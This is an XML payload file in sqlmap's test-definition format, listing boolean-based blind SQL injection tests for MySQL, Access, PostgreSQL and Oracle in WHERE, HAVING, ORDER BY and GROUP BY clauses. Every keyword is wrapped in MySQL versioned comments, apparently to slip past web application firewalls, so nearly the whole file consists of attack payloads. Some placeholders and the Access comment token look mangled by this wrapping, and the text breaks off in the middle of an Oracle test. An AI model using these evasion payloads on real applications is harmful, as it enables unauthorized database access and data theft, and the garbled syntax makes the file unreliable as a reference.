<?xml version="1.0" encoding="UTF-8"?>

<!--
Tag: <test>
    SQL injection test definition.

    Sub-tag: <title>
        Title of the test.

    Sub-tag: <stype>
        SQL injection family type.

        Valid values:
            1: Boolean-based blind SQL injection
            2: Error-based queries SQL injection
            3: Inline queries SQL injection
            4: Stacked queries SQL injection
            5: Time-based blind SQL injection
            6: UNION query SQL injection

    Sub-tag: <level>
        From which level check for this test.

        Valid values:
            1: Always (<100 requests)
            2: Try a bit harder (100-200 requests)
            3: Good number of requests (200-500 requests)
            4: Extensive test (500-1000 requests)
            5: You have plenty of time (>1000 requests)

    Sub-tag: <risk>
        Likelihood of a payload to damage the data integrity.

        Valid values:
            1: Low risk
            2: Medium risk
            3: High risk

    Sub-tag: <clause>
        In which clause the payload can work.

        NOTE: for instance, there are some payload that do not have to be
        tested as soon as it has been identified whether or not the
        injection is within a WHERE clause condition.

        Valid values:
            0: Always
            1: WHERE / HAVING
            2: GROUP BY
            3: ORDER BY
            4: LIMIT
            5: OFFSET
            6: TOP
            7: Table name
            8: Column name
            9: Pre-WHERE (non-query)

        A comma separated list of these values is also possible.

    Sub-tag: <where>
        Where to add our '<prefix> <payload><comment> <suffix>' string.

        Valid values:
            1: Append the string to the parameter original value
            2: Replace the parameter original value with a negative random
               integer value and append our string
            3: Replace the parameter original value with our string

    Sub-tag: <vector>
        The payload that will be used to exploit the injection point.

    Sub-tag: <request>
        What to inject for this test.

        Sub-tag: <payload>
            The payload to test for.

        Sub-tag: <comment>
            Comment to append to the payload, before the suffix.

        Sub-tag: <char>
            Character to use to bruteforce number of columns in UNION
            query SQL injection tests.

        Sub-tag: <columns>
            Range of columns to test for in UNION query SQL injection
            tests.

    Sub-tag: <response>
        How to identify if the injected payload succeeded.

        Sub-tag: <comparison>
            Perform a request with this string as the payload and compare
            the response with the <payload> response. Apply the comparison
            algorithm.

            NOTE: useful to test for boolean-based blind SQL injections.

        Sub-tag: <grep>
            Regular expression to grep for in the response body.

            NOTE: useful to test for error-based SQL injection.

        Sub-tag: <time>
            Time in seconds to wait before the response is returned.

            NOTE: useful to test for time-based blind and stacked queries
            SQL injections.

        Sub-tag: <union>
            Calls unionTest() function.

            NOTE: useful to test for UNION query (inband) SQL injection.

    Sub-tag: <details>
        Which details can be infered if the payload succeed.

        Sub-tags: <dbms>
            What is the database management system (e.g. MySQL).

        Sub-tags: <dbms_version>
            What is the database management system version (e.g. 5.0.51).

        Sub-tags: <os>
            What is the database management system underlying operating
            system.

    <test>
        <title></title>
        <stype></stype>
        <level></level>
        <risk></risk>
        <clause></clause>
        <where></where>
        <vector></vector>
        <request>
            <payload></payload>
            <comment></comment>
            <char></char>
            <columns></columns>
        </request>
        <response>
            <comparison></comparison>
            <grep></grep>
            <time></time>
            <union></union>
        </response>
        <details>
            <dbms></dbms>
            <dbms_version></dbms_version>
            <os></os>
        </details>
    </test>
-->

<root>
    <!-- Boolean-based blind tests - WHERE/HAVING clause -->
    <test>
        <title>AND boolean-based blind - WHERE or HAVING clause</title>
        <stype>1</stype>
        <level>1</level>
        <risk>1</risk>
        <clause>1,8,9</clause>
        <where>1</where>
        <vector>/*!50000AND/**_**/*/ [/*!50000INFERENCE/**_**/*/]</vector>
        <request>
            <payload>/*!50000AND/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]</payload>
        </request>
        <response>
            <comparison>/*!50000AND/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]</comparison>
        </response>
    </test>

    <test>
        <title>OR boolean-based blind - WHERE or HAVING clause</title>
        <stype>1</stype>
        <level>1</level>
        <risk>3</risk>
        <clause>1,9</clause>
        <where>2</where>
        <vector>/*!50000OR/**_**/*/ [/*!50000INFERENCE/**_**/*/]</vector>
        <request>
            <payload>/*!50000OR/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]</payload>
        </request>
        <response>
            <comparison>/*!50000OR/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]</comparison>
        </response>
    </test>

    <test>
        <title>OR boolean-based blind - WHERE or HAVING clause (NOT)</title>
        <stype>1</stype>
        <level>3</level>
        <risk>3</risk>
        <clause>1,9</clause>
        <where>1</where>
        <vector>/*!50000OR/**_**/*/ /*!50000NOT/**_**/*/ [/*!50000INFERENCE/**_**/*/]</vector>
        <request>
            <payload>/*!50000OR/**_**/*/ /*!50000NOT/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]</payload>
        </request>
        <response>
            <comparison>/*!50000OR/**_**/*/ /*!50000NOT/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]</comparison>
        </response>
    </test>

    <test>
        <title>AND boolean-based blind - WHERE or HAVING clause (subquery - comment)</title>
        <stype>1</stype>
        <level>2</level>
        <risk>1</risk>
        <clause>1,8,9</clause>
        <where>1</where>
        <vector>/*!50000AND/**_**/*/ [/*!50000RANDNUM/**_**/*/]=(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ (/*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/] /*!50000UNION/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM2/**_**/*/]) /*!50000END/**_**/*/))</vector>
        <request>
            <payload>/*!50000AND/**_**/*/ [/*!50000RANDNUM/**_**/*/]=(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ (/*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/] /*!50000UNION/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM2/**_**/*/]) /*!50000END/**_**/*/))</payload>
            <comment>[/*!50000GENERIC_SQL_COMMENT/**_**/*/]</comment>
        </request>
        <response>
            <comparison>/*!50000AND/**_**/*/ [/*!50000RANDNUM/**_**/*/]=(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ (/*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/] /*!50000UNION/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM2/**_**/*/]) /*!50000END/**_**/*/))</comparison>
        </response>
    </test>

    <test>
        <title>OR boolean-based blind - WHERE or HAVING clause (subquery - comment)</title>
        <stype>1</stype>
        <level>2</level>
        <risk>3</risk>
        <clause>1,9</clause>
        <where>2</where>
        <vector>/*!50000OR/**_**/*/ [/*!50000RANDNUM/**_**/*/]=(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ (/*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/] /*!50000UNION/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM2/**_**/*/]) /*!50000END/**_**/*/))</vector>
        <request>
            <payload>/*!50000OR/**_**/*/ [/*!50000RANDNUM/**_**/*/]=(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ (/*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/] /*!50000UNION/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM2/**_**/*/]) /*!50000END/**_**/*/))</payload>
            <comment>[/*!50000GENERIC_SQL_COMMENT/**_**/*/]</comment>
        </request>
        <response>
            <comparison>/*!50000OR/**_**/*/ [/*!50000RANDNUM/**_**/*/]=(/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ (/*!50000SELECT/**_**/*/ [/*!50000RANDNUM1/**_**/*/] /*!50000UNION/**_**/*/ /*!50000SELECT/**_**/*/ [/*!50000RANDNUM2/**_**/*/]) /*!50000END/**_**/*/))</comparison>
        </response>
    </test>

    <test>
        <title>AND boolean-based blind - WHERE or HAVING clause (comment)</title>
        <stype>1</stype>
        <level>2</level>
        <risk>1</risk>
        <clause>1</clause>
        <where>1</where>
        <vector>/*!50000AND/**_**/*/ [/*!50000INFERENCE/**_**/*/]</vector>
        <request>
            <payload>/*!50000AND/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]</payload>
            <comment>[/*!50000GENERIC_SQL_COMMENT/**_**/*/]</comment>
        </request>
        <response>
            <comparison>/*!50000AND/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]</comparison>
        </response>
    </test>

    <test>
        <title>OR boolean-based blind - WHERE or HAVING clause (comment)</title>
        <stype>1</stype>
        <level>2</level>
        <risk>3</risk>
        <clause>1</clause>
        <where>2</where>
        <vector>/*!50000OR/**_**/*/ [/*!50000INFERENCE/**_**/*/]</vector>
        <request>
            <payload>/*!50000OR/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]</payload>
            <comment>[/*!50000GENERIC_SQL_COMMENT/**_**/*/]</comment>
        </request>
        <response>
            <comparison>/*!50000OR/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]</comparison>
        </response>
    </test>

    <test>
        <title>OR boolean-based blind - WHERE or HAVING clause (NOT - comment)</title>
        <stype>1</stype>
        <level>4</level>
        <risk>3</risk>
        <clause>1</clause>
        <where>1</where>
        <vector>/*!50000OR/**_**/*/ /*!50000NOT/**_**/*/ [/*!50000INFERENCE/**_**/*/]</vector>
        <request>
            <payload>/*!50000OR/**_**/*/ /*!50000NOT/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]</payload>
            <comment>[/*!50000GENERIC_SQL_COMMENT/**_**/*/]</comment>
        </request>
        <response>
            <comparison>/*!50000OR/**_**/*/ /*!50000NOT/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]</comparison>
        </response>
    </test>

    <test>
        <title>AND boolean-based blind - WHERE or HAVING clause (MySQL comment)</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>1</clause>
        <where>1</where>
        <vector>/*!50000AND/**_**/*/ [/*!50000INFERENCE/**_**/*/]</vector>
        <request>
            <payload>/*!50000AND/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]</payload>
            <comment>#</comment>
        </request>
        <response>
            <comparison>/*!50000AND/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <test>
        <title>OR boolean-based blind - WHERE or HAVING clause (MySQL comment)</title>
        <stype>1</stype>
        <level>3</level>
        <risk>3</risk>
        <clause>1</clause>
        <where>2</where>
        <vector>/*!50000OR/**_**/*/ [/*!50000INFERENCE/**_**/*/]</vector>
        <request>
            <payload>/*!50000OR/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]</payload>
            <comment>#</comment>
        </request>
        <response>
            <comparison>/*!50000OR/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <test>
        <title>OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)</title>
        <stype>1</stype>
        <level>3</level>
        <risk>3</risk>
        <clause>1</clause>
        <where>1</where>
        <vector>/*!50000OR/**_**/*/ /*!50000NOT/**_**/*/ [/*!50000INFERENCE/**_**/*/]</vector>
        <request>
            <payload>/*!50000OR/**_**/*/ /*!50000NOT/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]</payload>
            <comment>#</comment>
        </request>
        <response>
            <comparison>/*!50000OR/**_**/*/ /*!50000NOT/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <test>
        <title>AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>1</clause>
        <where>1</where>
        <vector>/*!50000AND/**_**/*/ [/*!50000INFERENCE/**_**/*/]</vector>
        <request>
            <payload>/*!50000AND/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]</payload>
            <comment>%/*!5000016/**_**/*/</comment>
        </request>
        <response>
            <comparison>/*!50000AND/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]</comparison>
        </response>
        <details>
            <dbms>Microsoft Access</dbms>
        </details>
    </test>

    <test>
        <title>OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)</title>
        <stype>1</stype>
        <level>3</level>
        <risk>3</risk>
        <clause>1</clause>
        <where>2</where>
        <vector>/*!50000OR/**_**/*/ [/*!50000INFERENCE/**_**/*/]</vector>
        <request>
            <payload>/*!50000OR/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]</payload>
            <comment>%/*!5000016/**_**/*/</comment>
        </request>
        <response>
            <comparison>/*!50000OR/**_**/*/ [/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]</comparison>
        </response>
        <details>
            <dbms>Microsoft Access</dbms>
        </details>
    </test>

    <test>
        <title>MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause</title>
        <stype>1</stype>
        <level>2</level>
        <risk>1</risk>
        <clause>1,2,3</clause>
        <where>1</where>
        <vector>/*!50000RLIKE/**_**/*/ (/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!500000x28/**_**/*/ /*!50000END/**_**/*/))</vector>
        <request>
            <payload>/*!50000RLIKE/**_**/*/ (/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!500000x28/**_**/*/ /*!50000END/**_**/*/))</payload>
        </request>
        <response>
            <comparison>/*!50000RLIKE/**_**/*/ (/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000ORIGVALUE/**_**/*/] /*!50000ELSE/**_**/*/ /*!500000x28/**_**/*/ /*!50000END/**_**/*/))</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <test>
        <title>MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>1,2,3,8</clause>
        <where>1</where>
        <vector>/*!50000AND/**_**/*/ /*!50000MAKE_SET/**_**/*/([/*!50000INFERENCE/**_**/*/],[/*!50000RANDNUM/**_**/*/])</vector>
        <request>
            <payload>/*!50000AND/**_**/*/ /*!50000MAKE_SET/**_**/*/([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/],[/*!50000RANDNUM1/**_**/*/])</payload>
        </request>
        <response>
            <comparison>/*!50000AND/**_**/*/ /*!50000MAKE_SET/**_**/*/([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/],[/*!50000RANDNUM1/**_**/*/])</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <test>
        <title>MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)</title>
        <stype>1</stype>
        <level>3</level>
        <risk>3</risk>
        <clause>1,2,3</clause>
        <where>2</where>
        <vector>/*!50000OR/**_**/*/ /*!50000MAKE_SET/**_**/*/([/*!50000INFERENCE/**_**/*/],[/*!50000RANDNUM/**_**/*/])</vector>
        <request>
            <payload>/*!50000OR/**_**/*/ /*!50000MAKE_SET/**_**/*/([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/],[/*!50000RANDNUM1/**_**/*/])</payload>
        </request>
        <response>
            <comparison>/*!50000OR/**_**/*/ /*!50000MAKE_SET/**_**/*/([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/],[/*!50000RANDNUM1/**_**/*/])</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <test>
        <title>MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)</title>
        <stype>1</stype>
        <level>4</level>
        <risk>1</risk>
        <clause>1,2,3,8</clause>
        <where>1</where>
        <vector>/*!50000AND/**_**/*/ /*!50000ELT/**_**/*/([/*!50000INFERENCE/**_**/*/],[/*!50000RANDNUM/**_**/*/])</vector>
        <request>
            <payload>/*!50000AND/**_**/*/ /*!50000ELT/**_**/*/([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/],[/*!50000RANDNUM1/**_**/*/])</payload>
        </request>
        <response>
            <comparison>/*!50000AND/**_**/*/ /*!50000ELT/**_**/*/([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/],[/*!50000RANDNUM1/**_**/*/])</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <test>
        <title>MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)</title>
        <stype>1</stype>
        <level>4</level>
        <risk>3</risk>
        <clause>1,2,3</clause>
        <where>2</where>
        <vector>/*!50000OR/**_**/*/ /*!50000ELT/**_**/*/([/*!50000INFERENCE/**_**/*/],[/*!50000RANDNUM/**_**/*/])</vector>
        <request>
            <payload>/*!50000OR/**_**/*/ /*!50000ELT/**_**/*/([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/],[/*!50000RANDNUM1/**_**/*/])</payload>
        </request>
        <response>
            <comparison>/*!50000OR/**_**/*/ /*!50000ELT/**_**/*/([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/],[/*!50000RANDNUM1/**_**/*/])</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <test>
        <title>MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)</title>
        <stype>1</stype>
        <level>5</level>
        <risk>1</risk>
        <clause>1,2,3,8</clause>
        <where>1</where>
        <vector>/*!50000AND/**_**/*/ /*!50000EXTRACTVALUE/**_**/*/([/*!50000RANDNUM/**_**/*/],/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ /*!500000x3A/**_**/*/ /*!50000END/**_**/*/)</vector>
        <request>
            <payload>/*!50000AND/**_**/*/ /*!50000EXTRACTVALUE/**_**/*/([/*!50000RANDNUM/**_**/*/],/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ /*!500000x3A/**_**/*/ /*!50000END/**_**/*/)</payload>
        </request>
        <response>
            <comparison>/*!50000AND/**_**/*/ /*!50000EXTRACTVALUE/**_**/*/([/*!50000RANDNUM/**_**/*/],/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ /*!500000x3A/**_**/*/ /*!50000END/**_**/*/)</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <test>
        <title>MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)</title>
        <stype>1</stype>
        <level>5</level>
        <risk>3</risk>
        <clause>1,2,3,8</clause>
        <where>2</where>
        <vector>/*!50000OR/**_**/*/ /*!50000EXTRACTVALUE/**_**/*/([/*!50000RANDNUM/**_**/*/],/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ /*!500000x3A/**_**/*/ /*!50000END/**_**/*/)</vector>
        <request>
            <payload>/*!50000OR/**_**/*/ /*!50000EXTRACTVALUE/**_**/*/([/*!50000RANDNUM/**_**/*/],/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ /*!500000x3A/**_**/*/ /*!50000END/**_**/*/)</payload>
        </request>
        <response>
            <comparison>/*!50000OR/**_**/*/ /*!50000EXTRACTVALUE/**_**/*/([/*!50000RANDNUM/**_**/*/],/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ [/*!50000RANDNUM/**_**/*/] /*!50000ELSE/**_**/*/ /*!500000x3A/**_**/*/ /*!50000END/**_**/*/)</comparison>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <test>
        <title>PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)</title>
        <stype>1</stype>
        <level>2</level>
        <risk>1</risk>
        <clause>1,8</clause>
        <where>1</where>
        <vector>/*!50000AND/**_**/*/ (/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ /*!50000NULL/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CAST/**_**/*/('[/*!50000RANDSTR/**_**/*/]' /*!50000AS/**_**/*/ /*!50000NUMERIC/**_**/*/) /*!50000END/**_**/*/)) /*!50000IS/**_**/*/ /*!50000NULL/**_**/*/</vector>
        <request>
            <payload>/*!50000AND/**_**/*/ (/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ /*!50000NULL/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CAST/**_**/*/('[/*!50000RANDSTR/**_**/*/]' /*!50000AS/**_**/*/ /*!50000NUMERIC/**_**/*/) /*!50000END/**_**/*/)) /*!50000IS/**_**/*/ /*!50000NULL/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000AND/**_**/*/ (/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ /*!50000NULL/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CAST/**_**/*/('[/*!50000RANDSTR/**_**/*/]' /*!50000AS/**_**/*/ /*!50000NUMERIC/**_**/*/) /*!50000END/**_**/*/)) /*!50000IS/**_**/*/ /*!50000NULL/**_**/*/</comparison>
        </response>
        <details>
            <dbms>PostgreSQL</dbms>
        </details>
    </test>

    <test>
        <title>PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)</title>
        <stype>1</stype>
        <level>3</level>
        <risk>3</risk>
        <clause>1</clause>
        <where>2</where>
        <vector>/*!50000OR/**_**/*/ (/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ /*!50000NULL/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CAST/**_**/*/('[/*!50000RANDSTR/**_**/*/]' /*!50000AS/**_**/*/ /*!50000NUMERIC/**_**/*/) /*!50000END/**_**/*/)) /*!50000IS/**_**/*/ /*!50000NULL/**_**/*/</vector>
        <request>
            <payload>/*!50000OR/**_**/*/ (/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ /*!50000NULL/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CAST/**_**/*/('[/*!50000RANDSTR/**_**/*/]' /*!50000AS/**_**/*/ /*!50000NUMERIC/**_**/*/) /*!50000END/**_**/*/)) /*!50000IS/**_**/*/ /*!50000NULL/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000OR/**_**/*/ (/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ /*!50000NULL/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CAST/**_**/*/('[/*!50000RANDSTR/**_**/*/]' /*!50000AS/**_**/*/ /*!50000NUMERIC/**_**/*/) /*!50000END/**_**/*/)) /*!50000IS/**_**/*/ /*!50000NULL/**_**/*/</comparison>
        </response>
        <details>
            <dbms>PostgreSQL</dbms>
        </details>
    </test>

    <test>
        <title>Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)</title>
        <stype>1</stype>
        <level>2</level>
        <risk>1</risk>
        <clause>1</clause>
        <where>1</where>
        <vector>/*!50000AND/**_**/*/ (/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000INFERENCE/**_**/*/]) /*!50000THEN/**_**/*/ /*!50000NULL/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CTXSYS/**_**/*/./*!50000DRITHSX/**_**/*/./*!50000SN/**_**/*/(/*!500001/**_**/*/,[/*!50000RANDNUM/**_**/*/]) /*!50000END/**_**/*/) /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/) /*!50000IS/**_**/*/ /*!50000NULL/**_**/*/</vector>
        <request>
            <payload>/*!50000AND/**_**/*/ (/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM/**_**/*/]) /*!50000THEN/**_**/*/ /*!50000NULL/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CTXSYS/**_**/*/./*!50000DRITHSX/**_**/*/./*!50000SN/**_**/*/(/*!500001/**_**/*/,[/*!50000RANDNUM/**_**/*/]) /*!50000END/**_**/*/) /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/) /*!50000IS/**_**/*/ /*!50000NULL/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000AND/**_**/*/ (/*!50000SELECT/**_**/*/ (/*!50000CASE/**_**/*/ /*!50000WHEN/**_**/*/ ([/*!50000RANDNUM/**_**/*/]=[/*!50000RANDNUM1/**_**/*/]) /*!50000THEN/**_**/*/ /*!50000NULL/**_**/*/ /*!50000ELSE/**_**/*/ /*!50000CTXSYS/**_**/*/./*!50000DRITHSX/**_**/*/./*!50000SN/**_**/*/(/*!500001/**_**/*/,[/*!50000RANDNUM/**_**/*/]) /*!50000END/**_**/*/) /*!50000FROM/**_**/*/ /*!50000DUAL/**_**/*/) /*!50000IS/**_**/*/ /*!50000NULL/**_**/*/</comparison>
        </response>
        <details>
            <dbms>Oracle</dbms>
        </details>
    </test>

    <test>
        <title>Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)</title>
        <stype>1</stype>
        <level>3</level>
        <risk>3</risk>
        <clause>1</clause>
        <where>2</where>
